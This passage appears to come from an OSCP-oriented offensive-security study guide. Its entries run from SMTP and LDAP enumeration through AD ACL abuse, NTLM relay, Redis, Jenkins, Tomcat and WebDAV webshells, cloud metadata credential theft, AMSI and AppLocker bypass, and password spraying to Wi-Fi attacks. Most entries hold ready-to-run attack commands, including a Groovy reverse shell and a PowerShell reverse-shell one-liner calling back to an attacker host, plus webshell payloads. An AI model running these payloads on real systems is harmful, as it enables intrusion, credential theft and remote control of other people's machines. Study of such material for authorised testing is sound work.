A mail server often tells you whether a mailbox exists via its own verbs — a free username
oracle for later spraying.

## The verbs
    VRFY bob            # 'verify' a user:  250 = exists, 550 = no
    EXPN list           # expand a mailing list to members
    RCPT TO:<bob@dom>   # during a fake delivery; acceptance/rejection reveals validity

## Do it manually, then with a tool
    nc TARGET 25                       # read the banner (software/version)
    HELO x
    VRFY root
    # automated:
    smtp-user-enum -M VRFY -U users.txt -t TARGET
    smtp-user-enum -M RCPT -U users.txt -t TARGET     # when VRFY is disabled

## What you do with it
Confirmed usernames feed password spraying (SSH/SMB/web) and targeted attacks. The banner's
software/version feeds searchsploit. If you have creds, you may also send mail (phishing /
client-side, see client-side-attacks).

## Pattern
"Does the mail server confirm valid users?" Try VRFY, then EXPN, then RCPT TO. Turn the confirmed
list into a spraying list. Even a closed server leaks its software/version in the banner.

entries.title: LDAP enumeration (389/636)
entries.brief: Querying the directory — anonymously if you're lucky, with creds otherwise
entries.body:
## What LDAP is here
LDAP (389, or 636 LDAPS) is the query protocol for a directory — most importantly **Active
Directory**. It holds users, groups, computers, and their attributes (including, carelessly,
passwords in description fields).

## Anonymous first
    ldapsearch -x -H ldap://TARGET -s base namingcontexts    # find the base DN
    ldapsearch -x -H ldap://TARGET -b 'DC=corp,DC=local'     # dump if anon bind allowed
    nxc ldap TARGET -u '' -p ''                              # quick check

## With any domain credential
    ldapsearch -x -H ldap://TARGET -D 'bob@corp.local' -w 'P@ss' -b 'DC=corp,DC=local' \
      '(objectClass=user)' sAMAccountName description memberOf
    nxc ldap TARGET -u bob -p 'P@ss' --users --groups --kerberoasting

## What to hunt
- `description`/`info` fields with passwords (shockingly common).
- Users, groups, and who's in Domain Admins; computers and their OS.
- SPNs (-> Kerberoast), 'DONT_REQ_PREAUTH' accounts (-> AS-REP roast).

## Pattern
"Can I bind anonymously, and if not, with any cred?" Find the base DN, then dump users/groups and
grep attributes for passwords. LDAP is the structured view of AD that feeds BloodHound,
Kerberoasting and spraying. (See: active-directory-basics.)

entries.title: DNS enumeration
entries.brief: Turning the name system into a map of hosts and subdomains
entries.body:
## Why DNS first
DNS maps names to infrastructure. Before (and during) scanning, it hands you subdomains, mail and
name servers, and — if misconfigured — the entire zone.

## The passes
    dig +short box.htb; host box.htb                 # resolve
    dig box.htb NS; dig box.htb MX; dig box.htb TXT  # infrastructure records
    dig @ns1.box.htb box.htb AXFR                     # ZONE TRANSFER — dumps everything if allowed
    dnsrecon -d box.htb -a                            # automated incl. AXFR
    # brute subdomains:
    dnsrecon -d box.htb -D subdomains.txt -t brt
    ffuf -w subs.txt -H 'Host: FUZZ.box.htb' -u http://TARGET -fs 0   # vhost brute (web)

## The jackpot: zone transfer (AXFR)
A misconfigured name server will hand a client its whole zone — every record, including internal
hosts. Always try it against each NS.

## /etc/hosts
On a box or lab, add discovered names so tools and vhosts resolve:
    echo "$TARGET box.htb" | sudo tee -a /etc/hosts

## Pattern
Resolve -> records (NS/MX/TXT) -> try AXFR on each NS -> brute subdomains/vhosts. Every new name
is more attack surface; add it to /etc/hosts and enumerate it. (See: atlas dig/host/dnsrecon.)

entries.title: Active Directory ACL abuse
entries.brief: Why a dangerous permission on an object is a path to Domain Admin
entries.body:
## The idea
Every AD object has an ACL. If your account (or one you control) holds a powerful right **over**
another object, you can modify that object to take it over — no exploit, just permissions.
BloodHound draws these as edges.

## The rights that matter (and what each enables)
- **GenericAll / GenericWrite** over a user -> set an SPN then Kerberoast, or set a fake cert
  (shadow credentials), or reset... (GenericAll = full control).
- **ForceChangePassword** over a user -> reset their password.
    net rpc password "victim" "NewP@ss1" -U "DOMAIN/you%pass" -S DC
- **WriteDACL / WriteOwner** over an object -> grant yourself more rights, then abuse them.
- **AddMember** over a group -> add yourself (e.g. to a privileged group).
    bloodyAD --host DC -d corp -u you -p pass add groupMember "Group" you
- **AddKeyCredentialLink** (GenericWrite) -> **shadow credentials**: add a key, get a cert/TGT.
    certipy shadow auto -u you@corp -p pass -account victim

## The workflow
    bloodhound-python ... ; import ; run 'Shortest paths to Domain Admins'
    # the graph shows the exact edges; abuse them in order with bloodyAD / impacket / certipy

## Pattern
"What do I (or an account I own) have control *over*?" GenericAll/Write, WriteDACL, ForceChange,
AddMember, AddKeyCredentialLink each convert a permission into control of the next object. Chain
the edges BloodHound shows up to Domain Admin.

entries.title: NTLM coercion & relay
entries.brief: Forcing a victim to authenticate to you, then relaying it onward
entries.body:
## Two ideas that combine
- **Coercion**: make a Windows host *authenticate* to a machine you choose. Triggers:
  PetitPotam (EfsRpc), PrinterBug/SpoolSample (spooler), DFSCoerce, ShadowCoerce.
- **Relay**: take that incoming NTLM authentication and **forward it** to another service that
  accepts it — authenticating to the target *as the coerced machine/user*.

## Why it works
NTLM doesn't bind the authentication to the server you meant to reach. If SMB signing is **not
required** (or you relay to LDAP/HTTP), the auth is valid wherever you forward it.

## The classic chains
    # 1) start the relay (to LDAP for RBCD, or to SMB on a no-signing host):
    impacket-ntlmrelayx -t ldap://DC --delegate-access     # -> RBCD -> impersonate admin
    impacket-ntlmrelayx -t smb://VICTIM2 -smb2support       # -> exec as the relayed account
    # 2) coerce a victim to auth to YOU:
    petitpotam.py -u user -p pass ATTACKER DC
    printerbug.py corp/user:pass@VICTIM ATTACKER
Relaying a DC's machine auth to AD CS (ESC8) or to LDAP for RBCD is a common path to DA.

## The prerequisite to check
    nxc smb SUBNET --gen-relay-list targets.txt     # hosts where SMB signing is NOT required

## Pattern
"Can I make something authenticate to me, and relay that auth somewhere useful?" Coerce
(PetitPotam/PrinterBug) + relay (ntlmrelayx to LDAP/SMB/AD CS). Signing-not-required hosts and
delegation sinks are what make it land.

entries.title: 64-bit overflows, NX/ASLR and ret2libc/ROP
entries.brief: How modern mitigations change the simple stack overflow, conceptually
entries.body:
## What changed from the 32-bit classic
The basic bug is the same (overflow -> control the saved return address), but on 64-bit with
modern protections you usually can't just 'jump to your shellcode':
- **NX / DEP** — the stack is non-executable, so shellcode on the stack won't run. You must reuse
  *existing* executable code.
- **ASLR** — libraries/stack load at random addresses, so you can't hardcode them; you need a
  **leak** of a real address first.
- **Stack canaries** — a guard value detects overwrites before return; you must leak or avoid it.
- **Calling convention** — 64-bit passes args in registers (rdi, rsi, ...), not on the stack, so
  you set them with gadgets.

## The techniques (reuse, don't inject)
- **ret2libc** — overwrite the return address to call an existing libc function (e.g. `system`)
  with your argument ("/bin/sh").
- **ROP (Return-Oriented Programming)** — chain tiny `...; ret` **gadgets** to set registers and
  make syscalls, building the behaviour you want from pieces already in the binary/libc.
    ROPgadget --binary ./vuln | grep 'pop rdi'      # find gadgets
    # leak an address (e.g. puts@got) -> compute libc base -> ret2system

## Scope note
OSCP's overflow is the gentle 32-bit, NX/ASLR-off stack case (see buffer-overflow-basics). ROP/
ret2libc is OSED/CTF territory — worth understanding conceptually.

## Pattern
"Can I inject code, or must I reuse it?" NX -> reuse (ret2libc/ROP); ASLR -> leak an address
first; canary -> leak/avoid it. Modern exploitation is assembling behaviour from existing code,
not running your own bytes on the stack.

entries.title: Client-side attacks
entries.brief: When there's no server bug, you target the human and their software
entries.body:
## When you reach for this
Some targets expose no exploitable service — the way in is a **user** opening something. You craft
a file or link that runs code in the victim's context when they interact with it. (OSCP has a
client-side component; always stay within the engagement's scope.)

## Common vectors
- **Malicious documents**: Office macros (VBA) or an embedded object that runs a payload on open.
- **HTA / LNK / CHM / ISO**: Windows file types that can execute code when launched.
- **Browser / reader exploits**: a crafted page or PDF against a vulnerable client version
  (match with searchsploit against the exact version).
- **Phishing email**: deliver the above; SMTP enum/known addresses help targeting.

## The mechanics
1. Build a payload (msfvenom / a macro that downloads+runs a stager).
2. Host it (python3 -m http.server) and/or attach it to mail.
3. Catch the shell (nc / multi/handler) when the victim opens it.
4. Expect AV/Defender — see av-evasion-basics.

## Scope and ethics
Client-side = targeting people. Only against users explicitly in scope; phishing real third
parties without authorisation is illegal. Document exactly what you sent and to whom.

## Pattern
"No server bug — what will a user open?" Pick a file/link their software will execute, deliver it,
and catch the callback. Enumerate the client's software versions first; evasion and delivery are
the hard parts.

entries.title: Redis (6379) — unauth cache to RCE
entries.brief: Why an open, password-less Redis becomes file write and often a shell
entries.body:
## The setup
Redis is an in-memory data store (default port 6379). Historically it binds with **no
authentication**. If you can run commands, you can often write files anywhere the redis user can
— turning a cache into code execution.

## Connect and confirm
    redis-cli -h TARGET                 # or: nc TARGET 6379  then  INFO
    TARGET:6379> INFO                   # version, role; NOAUTH error = password set
    TARGET:6379> CONFIG GET dir          # where it writes

## Write-primitive -> RCE (classic paths)
Point Redis's save location/filename at a sensitive path, then SAVE:
    CONFIG SET dir /var/www/html
    CONFIG SET dbfilename shell.php
    SET x "<?php system($_GET['c']); ?>"
    SAVE                                 # writes /var/www/html/shell.php
Other variants: write an SSH **authorized_keys** (CONFIG SET dir ~/.ssh), or abuse the module
API (MODULE LOAD) / replication for direct RCE on newer versions.

## Pattern
"Can I run Redis commands unauthenticated, and where can it write?" Use CONFIG SET dir/dbfilename
+ SAVE to drop a webshell or an SSH key in a writable path owned by the redis user. Same idea
applies to other exposed data stores — enumerate access, then use their file/command primitives
(see database-enum).

entries.title: Jenkins — Script Console to shell
entries.brief: Why reaching Jenkins (esp. the Groovy console) usually means RCE
entries.body:
## Why Jenkins is high-value
Jenkins is a CI server that *runs code by design*. If you reach an admin (or an unauthenticated
instance), the built-in **Script Console** executes Groovy on the controller — instant RCE, often
as a privileged service account.

## Get in
- Default/guessable creds, or no auth at all; check /manage, /script, /asynchPeople/.
- Old versions have pre-auth RCEs (searchsploit jenkins <version>).

## The Script Console (/script)
    // Groovy -> OS command:
    println "id".execute().text
    // reverse shell:
    String host="LHOST"; int port=4444;
    Thread.start{ def s=new Socket(host,port); def p=["/bin/bash","-i"].execute();
      p.consumeProcessOutput(s.outputStream, s.outputStream); p.consumeProcessErrorStream(s.outputStream);
      s.inputStream.eachByte{ p.outputStream.write(it) } }

## Other execution spots
A build job's "Execute shell" step, pipeline scripts, and agents also run commands. Credentials
stored in Jenkins (credentials.xml / the Credentials plugin) are prime loot.

## Pattern
"Can I reach Jenkins and run Groovy or define a build step?" Either is RCE on the controller.
Enumerate /script and job config, drop a reverse shell, and loot stored credentials.

entries.title: Apache Tomcat — deploy a WAR for RCE
entries.brief: Why Manager access lets you upload a web app that is a shell
entries.body:
## The setup
Tomcat serves Java web apps (default 8080). Its **Manager** app (/manager/html) can deploy a new
application from a WAR file. If you can authenticate to Manager, you deploy a WAR that is a
webshell/reverse shell — code execution as the Tomcat user.

## Get Manager creds
- Defaults are rampant: tomcat:tomcat, admin:admin, tomcat:s3cret; see conf/tomcat-users.xml.
- Brute the basic-auth: `hydra -L users -P pass TARGET http-get /manager/html`.

## Deploy a malicious WAR
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=4444 -f war -o shell.war
    # upload via the Manager UI, or:
    curl -u tomcat:tomcat -T shell.war "http://TARGET:8080/manager/text/deploy?path=/x"
    # catch the shell, then browse:
    curl http://TARGET:8080/x/        # triggers it ; nc -lvnp 4444 waiting

## Other paths
Old Tomcat/Coyote CVEs (Ghostcat/AJP CVE-2020-1938 for file read), and PUT-enabled servlets.

## Pattern
"Can I authenticate to Tomcat Manager (default/brute creds)?" If yes, deploy a JSP WAR reverse
shell and trigger it. Check conf/tomcat-users.xml if you can already read files.

entries.title: WebDAV — HTTP PUT to webshell
entries.brief: When a web server lets you upload files over HTTP methods
entries.body:
## The setup
WebDAV extends HTTP with methods to manage files (PUT, DELETE, MOVE, PROPFIND). If a server
allows **PUT** (and runs what you upload), you can drop a webshell directly.

## Detect
    curl -s -X OPTIONS http://TARGET/ -i | grep -i allow     # look for PUT, DELETE, MOVE
    davtest -url http://TARGET/                               # tests what you can upload+execute
    nmap -p80 --script http-webdav-scan TARGET

## Exploit
    # upload a shell (if the server executes the extension):
    curl -X PUT http://TARGET/shell.php --data-binary @shell.php
    # blocked extension? PUT a .txt then MOVE it:
    curl -X PUT http://TARGET/s.txt --data-binary @shell.php
    curl -X MOVE http://TARGET/s.txt -H 'Destination: http://TARGET/s.php'
    # with creds:
    cadaver http://TARGET/      # interactive put

## Pattern
"Does OPTIONS list PUT/MOVE, and does the server execute what I upload?" PUT a webshell (or PUT
then MOVE past an extension filter) and browse to it. `davtest` tells you exactly which
extensions upload and execute.

entries.title: Steganography & file forensics (CTF)
entries.brief: How data hides inside files, and the tools that pull it back out
entries.body:
## The idea
Steganography hides data *inside* another file (an image, audio, document). In CTFs (and
occasionally real loot), a flag or credential is tucked into a picture or a seemingly ordinary
file. Treat every provided file as possibly carrying more than it shows.

## The reflex workflow on any file
    file suspicious.png            # what is it really? (extension can lie)
    exiftool suspicious.png        # metadata: author, comments, GPS, hidden notes
    strings -n 8 suspicious.png    # readable text, URLs, base64 blobs
    binwalk suspicious.png         # embedded/appended files (a zip hidden after a jpg)
    binwalk -e suspicious.png      # extract what it found
    xxd suspicious.png | head      # check magic bytes / spot appended data

## Image/audio-specific
    steghide extract -sf img.jpg   # JPEG/WAV stego (prompts for a passphrase; crack with stegseek)
    zsteg img.png                  # LSB stego in PNG/BMP
    # audio: open in Audacity, view the spectrogram (text hidden in frequencies)

## Pattern
"Is there more in this file than its surface?" Run file -> exiftool -> strings -> binwalk first;
then format-specific tools (steghide/zsteg/spectrogram). A passphrase-protected steghide file
cracks with stegseek + rockyou. Appended archives (binwalk) are the most common trick.

entries.title: Crypto basics for CTFs
entries.brief: Recognising and breaking the common encodings and weak ciphers
entries.body:
## First: encoding vs cipher vs hash
- **Encoding** (base64/hex/URL) — reversible, no key. Just decode (see encoding-basics).
- **Cipher** — needs a key; may be weak/classical and breakable.
- **Hash** — one-way; you crack by guessing (see password-cracking-workflow).
Identify which you're facing before reaching for tools.

## Classical ciphers (common in CTFs)
- **Caesar/ROT13/ROToN** — shift letters; brute all 25 shifts.  `echo txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- **Vigenere** — repeating-key shift; break with known tools / frequency analysis.
- **XOR** — `cipher XOR key`. Single-byte XOR brute-forces trivially; reused-key XOR leaks via
  crib-dragging.  CyberChef's 'XOR Brute Force' is the fast path.
- **Substitution** — frequency analysis (quipqiup).

## RSA (the CTF staple)
Public key is (n, e); you need the private exponent d. If n is small or poorly chosen it breaks:
    # factor a small/weak n:
    factordb (online), or:  python3 -c "import sympy;print(sympy.factorint(N))"
    # then with p,q,e -> compute d and decrypt (RsaCtfTool automates many attacks):
    RsaCtfTool --publickey key.pub --uncipherfile cipher.bin

## Swiss-army tool
**CyberChef** (local copy) recognises and chains decode/decrypt operations ('Magic' mode often
solves encoding stacks outright).

## Pattern
"Encoding, cipher, or hash?" Decode encodings; brute/analyse weak classical ciphers; attack RSA
via a weak modulus (factordb/RsaCtfTool); crack hashes. CyberChef + the right identification get
you most of the way.

entries.title: Cloud basics: metadata, roles and buckets
entries.brief: The handful of cloud facts that turn SSRF or a key into access
entries.body:
## Why a pentester cares
Cloud adds a few high-impact primitives: an **instance metadata service** reachable from inside a
VM, **IAM roles/keys** that grant API access, and **object storage** (buckets) that is often
misconfigured to public.

## Instance metadata (the SSRF jackpot)
A VM can query a magic local address for its identity and **temporary credentials**:
    # AWS (IMDSv1):
    curl http://169.254.169.254/latest/meta-data/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>  # keys!
    # GCP needs a header:
    curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/
An **SSRF** (see ssrf-logic) that reaches this address exfiltrates cloud credentials. IMDSv2
requires a token first, which blocks naive SSRF.

## Using keys you find
    export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
    aws sts get-caller-identity          # who am I?
    aws s3 ls                            # what can I see?
    aws s3 cp s3://bucket/secret .       # loot

## Public buckets
    aws s3 ls s3://company-backups --no-sign-request      # anonymous listing
    curl https://company-backups.s3.amazonaws.com/        # public read

## Pattern
"Can I reach the metadata service (via SSRF or a shell), or do I have keys/an open bucket?"
Metadata -> temporary creds; creds -> enumerate with `aws sts/s3/iam`; public buckets -> grab the
data. The cloud boundary is identity, not the network.

entries.title: Getting and upgrading Windows shells
entries.brief: Catching a Windows callback and making it usable
entries.body:
## Catching a Windows reverse shell
Same idea as Linux (you listen, the target connects back), with Windows-flavoured triggers:
    nc -lvnp 4444                       # your listener
    # target (PowerShell one-liner — the common one):
    powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();
      [byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){
      $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
      $sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';
      $sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"
Or deliver nc.exe / an msfvenom exe (see file-transfer, msfvenom-payloads).

## Upgrading a raw Windows shell
Windows has no pty like Linux, but you can:
- **ConPTY**: ConPtyShell gives a near-fully-interactive shell (best option).
    # attacker: stty raw -echo; (listener) ; target runs Invoke-ConPtyShell
- Prefer **WinRM** (evil-winrm) or **RDP** (xfreerdp) once you have creds/hash — proper sessions.
- `powershell -ep bypass` to relax the execution policy for your session.

## Orientation once you land
    whoami /priv ; whoami /groups ; systeminfo ; hostname
Then run winPEAS and work windows-service-privesc / windows-token-privesc.

## Pattern
"Catch the callback, then get a real session." nc + a PowerShell one-liner to land; ConPtyShell
to upgrade, or pivot to evil-winrm/xfreerdp with creds. Orient with whoami /priv immediately.

entries.title: NoSQL injection (MongoDB & friends)
entries.brief: Why operator-based queries let you bypass auth and extract data
entries.body:
## The root cause
NoSQL databases query with structured objects, not SQL strings. If the app builds that object
from user input without type/shape checking, you inject **operators** ($ne, $gt, $regex) that
change the query's logic.

## Auth bypass (the classic)
A login does `db.users.findOne({user: input.user, pass: input.pass})`. Send operators instead of
strings:
    # JSON body:
    {"user": {"$ne": null}, "pass": {"$ne": null}}        # matches the first user -> logged in
    # or as URL-encoded params (PHP turns user[$ne]=1 into an operator):
    user[$ne]=1&pass[$ne]=1

## Extract data (blind, with $regex)
When there's no direct output, leak a value character by character:
    {"user":"admin","pass":{"$regex":"^a"}}   # true/false response reveals the first char
Automate with **nosqlmap**, or a script that walks the regex.

## $where / JS injection
Some engines evaluate JavaScript (`$where`), enabling boolean/time-based blind extraction similar
to SQLi.

## Pattern
"Can I send an object/operator where the app expects a string?" `{"$ne":null}` for auth bypass,
`$regex` for blind extraction. The fix you bypass is strict input typing (reject non-strings).
Contrast with SQLi (database-enum/sqli-logic) — same idea, different query model.

entries.title: Race conditions (TOCTOU)
entries.brief: Why doing something twice at once beats a one-at-a-time check
entries.body:
## The root cause
A **time-of-check / time-of-use** gap: the app checks a condition, then acts — but if two
requests interleave between the check and the use, both pass the check. Concurrency breaks logic
that assumed one-at-a-time.

## Where it bites (web)
- **Limit bypass**: redeem a one-time coupon, withdraw/transfer balance, or use a gift card
  **many times at once** before the 'used' flag is written.
- **Double-spend / over-draft**: two withdrawals each see the old balance.
- **Account/state**: register the same unique thing twice; approve+use before revoke.

## Exploit it
Fire many identical requests **simultaneously** so they hit the gap together:
    # Burp Repeater -> 'Send group in parallel' (single-packet attack), or:
    seq 20 | xargs -P20 -I_ curl -s -X POST http://TARGET/redeem -d 'code=ONCE' -b "session=..."
The more parallelism, the better the odds of landing in the window.

## Filesystem cousin (local)
A privileged script that checks a file then uses it can be beaten with a symlink swap between the
two steps — the Linux TOCTOU race.

## Pattern
"Does a check and the action it guards happen in two steps?" Hit them concurrently so multiple
requests pass the check before the state updates. The fix you bypass is atomic operations /
locking.

entries.title: Prototype pollution (JavaScript/Node)
entries.brief: Why polluting Object.prototype can change app behaviour and reach RCE
entries.body:
## The root cause (Node/JS)
In JavaScript, objects inherit from `Object.prototype`. If code merges attacker-controlled keys
into an object without guarding `__proto__`/`constructor.prototype`, you can set properties on
**every** object at once — 'polluting' the prototype.

    // vulnerable deep-merge of user JSON:
    {"__proto__": {"isAdmin": true}}      // now every object has isAdmin = true
    {"constructor": {"prototype": {"isAdmin": true}}}

## What it buys you
- **Logic/privilege bypass**: a later `if (user.isAdmin)` is now true for everyone.
- **Gadget -> RCE**: if some library later reads a polluted property it uses in a dangerous way
  (e.g. a template engine's options, child_process args), pollution becomes code execution. This
  is the OSWE-style 'find the gadget' chase.
- **DoS**: polluting a widely-used property can crash the app.

## Find it
Send `__proto__` payloads into JSON bodies / query params that get merged, then check whether an
unrelated object now carries your property (reflected in a response or behaviour change). Tools:
server-side via known gadgets; client-side via DOM sinks.

## Pattern
"Does the app merge my keys into an object without blocking __proto__/constructor?" Pollute a
property the app trusts (isAdmin) or that a library turns into a command (gadget). The fix you
bypass is sanitising keys / using Map / Object.create(null).

entries.title: systemd service & timer privesc
entries.brief: Why a writable unit, timer, or service-invoked script hands you root
entries.body:
## The angle
systemd runs units (services/timers) — many as **root**. If you can control what a root unit
executes, or create one, root runs your code. The Linux cousin of Windows service privesc.

## What to look for
    systemctl list-timers --all                     # scheduled runs (cron's systemd equivalent)
    systemctl cat <service>                           # the unit: ExecStart=, User=
    find /etc/systemd /lib/systemd /run/systemd -writable 2>/dev/null   # writable unit files
    # a unit whose ExecStart script/binary you can write, or a writable .service/.timer

## The exploits
- **Writable unit file** (.service/.timer) running as root:
    [Service]
    ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
    # then: systemctl daemon-reload; systemctl start <unit>  (if you can), or wait for a timer
- **Writable ExecStart target**: edit the script/binary a root unit runs.
- **Relative paths / writable PATH** used inside a unit -> hijack (see path-variable).
- **sudo systemctl** allowed? `oscp gtfo systemctl sudo` (it can spawn a pager/editor -> shell).

## Pattern
"Can I control what a root systemd unit runs — its file, its ExecStart target, or its PATH — or
create a unit?" Any of those = root on start or on the next timer. Check `systemctl cat` and unit
file permissions; `pspy` shows timers firing.

entries.title: AD domain & forest trusts
entries.brief: Why owning one domain can reach another across a trust
entries.body:
## What a trust is
A **trust** lets principals in one domain authenticate to resources in another. Within a forest,
domains trust each other (transitive, two-way). Between forests, trusts are explicit. Owning one
domain often becomes a path into trusting ones.

## Enumerate trusts
    nltest /domain_trusts                      # from Windows
    # BloodHound shows trust edges; Impacket:
    impacket-lookupsid DOMAIN/user:pass@DC     # SIDs across the trust

## The abuses (concept)
- **Intra-forest (child -> parent)**: the forest root is the real boundary. With the child domain's
  krbtgt you can forge a ticket with **SID history** of the parent's Enterprise Admins ->
  Domain/Enterprise Admin in the root. ('SID-history injection' via golden ticket + extra SIDs.)
- **Inter-forest**: more limited (SID filtering), but **trust account** keys, foreign-group
  memberships, and shared service accounts still enable movement; Kerberoast across the trust.
    impacket-ticketer ... -extra-sid <EnterpriseAdmins SID>    # forge with SID history

## Pattern
"Is this domain trusted by, or trusting, another?" Enumerate trusts (nltest/BloodHound). Child ->
parent in a forest is usually fully reachable (krbtgt + SID history); cross-forest needs a shared
secret or foreign membership. BloodHound maps which edges actually work.

entries.title: AppLocker, Constrained Language & AMSI
entries.brief: The Windows execution controls you'll meet, and how they're bypassed
entries.body:
## Three controls, one goal: stop your code running
- **AppLocker / WDAC** — allow-lists which executables/scripts/DLLs may run (often by path,
  publisher, or hash).
- **PowerShell Constrained Language Mode (CLM)** — strips dangerous language features when
  AppLocker is on, blocking most offensive PowerShell.
- **AMSI** — scans scripts/commands in memory before execution and lets AV veto them.

## The bypass ideas (authorised testing only)
- **AppLocker gaps**: allow-lists are leaky. Writable allowed-paths
  (`C:\Windows\Tasks`, `System32\spool\drivers\color`), LOLBAS binaries (msbuild, installutil,
  regsvr32) that run code while being 'trusted'.
- **CLM**: escape via a bypass runspace, custom runspaces, or just run a non-PowerShell payload
  (C#, LOLBAS) instead of scripts.
- **AMSI**: patch amsi.dll's scan function in your process memory, or obfuscate so the signature
  misses (see av-evasion-basics). Re-check each session — it resets.

## Enumerate what's enforced
    $ExecutionContext.SessionState.LanguageMode     # FullLanguage vs ConstrainedLanguage
    Get-AppLockerPolicy -Effective -Xml             # the rules (where allowed, what's writable)

## Pattern
"Which control is stopping me — the allow-list (AppLocker), the language mode (CLM), or the
in-memory scanner (AMSI)?" Each has its own bypass: writable allowed paths / LOLBAS for
AppLocker, non-PS or runspace tricks for CLM, patch/obfuscate for AMSI. Identify, then pick the
matching lever.

entries.title: Password spraying (without locking everyone out)
entries.brief: One password across many users — the safe, high-yield credential attack
entries.body:
## Why spray, not brute
Brute-forcing one user trips lockout fast. **Spraying** flips it: try ONE likely password across
MANY users, then wait, then try the next. You stay under the lockout threshold and exploit the
fact that in any big user set, someone uses `Season2026!`.

## Check the policy FIRST (don't lock accounts)
    nxc smb DC -u user -p pass --pass-pol         # lockout threshold + observation window
    # or: net accounts  /  rpcclient: getdompwinfo
Stay a couple of attempts below the threshold, and spread attempts across the observation window.

## Build the inputs
- **Users**: from enum (kerbrute userenum, enum4linux, LDAP) or OSINT name schemes.
- **Passwords**: seasonal/company patterns (Season+Year!, Company123, Welcome1, Password1), plus
  anything you cracked/found (reuse!).

## Spray
    kerbrute passwordspray -d corp.local --dc DC users.txt 'Season2026!'     # quiet (Kerberos)
    nxc smb DC -u users.txt -p 'Season2026!' --continue-on-success           # SMB
    nxc ldap/winrm/ssh ...                                                    # pick the service
`--continue-on-success` so it reports every hit, not just the first.

## Pattern
"One password, many users, respect the lockout policy." Enumerate users -> check pass-pol -> spray
seasonal/reused passwords with a safe margin -> every hit is a foothold to reuse everywhere. The
single most productive AD attack after initial enum.

entries.title: Metasploit basics (and the OSCP limit)
entries.brief: The framework's core workflow — and when you're allowed to use it
entries.body:
## The OSCP rule first
On the OSCP exam you may use Metasploit's full feature set on **only one** target machine
(and msfvenom/multi-handler are fine throughout). So learn manual exploitation as the default,
and keep MSF for that one allowance or for your labs. In real engagements there's no such limit.

## The core workflow
    msfconsole -q
    search <product> <version>          # find a module
    use exploit/<path>                  # select it
    show options                        # required settings (RHOSTS, RPORT, LHOST...)
    set RHOSTS TARGET; set LHOST tun0; set LPORT 4444
    set PAYLOAD <payload>               # show payloads to list compatible ones
    check                               # (if supported) is it likely vulnerable?
    run                                 # or 'exploit'

## Sessions & post
    sessions -l ; sessions -i 1         # list / interact
    background                          # drop a session to the console
    use post/multi/recon/local_exploit_suggester   # privesc ideas from a session
    meterpreter> getuid; sysinfo; hashdump; load kiwi

## The exam-friendly piece: multi/handler
Catch a payload you built with msfvenom without 'using Metasploit to exploit':
    use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST tun0; set LPORT 4444; run

## Pattern
search -> use -> set options/payload -> check -> run -> interact/post. Powerful, but ration it to
the OSCP single-machine rule; prefer manual exploits and plain reverse shells (msfvenom + nc) the
rest of the time.

entries.title: Kali's built-in resources — where everything lives
entries.brief: The shared files Kali ships (wordlists, Windows tools, webshells) and the dirs you work from
entries.body:
## /usr/share — Kali's shared toolbox
Most of Kali's bundled data lives under /usr/share. Learn these paths; they save you downloading
what's already on disk.

| Path | What's there |
| --- | --- |
| /usr/share/wordlists/ | the wordlist hub (symlinks to the big sets) |
| /usr/share/wordlists/rockyou.txt(.gz) | the default password list — `gunzip` it once |
| /usr/share/seclists/ | the toolkit: Passwords/, Usernames/, Discovery/Web-Content/, Discovery/DNS/ |
| /usr/share/wordlists/dirb/, /dirbuster/ | web content lists |
| /usr/share/windows-resources/binaries/ | nc.exe, plink.exe, wget.exe, whoami.exe, fgdump... |
| /usr/share/windows-resources/ | mimikatz, powersploit, powercat, binaries |
| /usr/share/webshells/ | ready webshells: php/, asp/, aspx/, jsp/, cfm/ |
| /usr/share/nmap/scripts/ | NSE scripts (`ls | grep smb`) |
| /usr/share/metasploit-framework/ | MSF modules/data |
| /usr/share/exploitdb/ (searchsploit) | the local Exploit-DB copy |
| /usr/share/responder/, /usr/share/nishang/, /usr/share/powershell-empire/ | AD/post tools |

## Working directories on a TARGET (not Kali)
| Path | Why it matters |
| --- | --- |
| /tmp, /dev/shm | world-writable (drwxrwxrwt) — stage your tools/exploits here as a low-priv user |
| /var/www/ | web roots — configs with DB creds (wp-config.php, .env), writable = webshell |
| /var/log/ | auth.log/syslog — creds in logs, and your footprints (logging-and-footprints) |
| /var/backups/, /opt/ | backups (old /etc/shadow!), third-party apps with creds |
| /proc/version, /etc/os-release | kernel + distro for exploit matching (kernel-exploits) |
| /home/*, /root | user loot: .ssh, histories, configs (creds-hunting) |
| /etc/ | the config tour (etc-config-files) |

## Pattern
On Kali: pull from /usr/share (wordlists, windows-resources, webshells) instead of downloading.
On a target: **work from /tmp or /dev/shm** (writable as any user), read /var/www and /var/backups
for creds, and check /proc/version for the kernel. Knowing the paths is half the speed.

entries.title: Wi-Fi pentesting — the landscape
entries.brief: 802.11 basics, monitor mode, and the modern attack menu
entries.body:
## The prerequisites
Wi-Fi attacks need a card in **monitor mode** (sniff all frames) that supports **packet
injection**. Your laptop's built-in card usually can't inject — and inside a VM you need an
**external USB adapter** (see wireless-lab-setup-macos). Know your terms:
- **BSSID** = the AP's MAC; **ESSID** = the network name; **channel** = the radio channel;
  **client/STA** = a connected device.

## Put the card in monitor mode
    sudo airmon-ng check kill            # stop NetworkManager etc. that fight monitor mode
    sudo airmon-ng start wlan0           # -> wlan0mon (monitor interface)
    iw dev                               # confirm 'type monitor'

## The modern attack menu (WPA2/WPA3-PSK)
- **Capture the WPA2 4-way handshake** (deauth a client to force a reconnect) -> crack offline.
- **PMKID attack** — grab a hash from the AP directly, often **no client needed** (hcxdumptool).
- **Evil twin / rogue AP** — clone the SSID, capture creds via a captive portal.
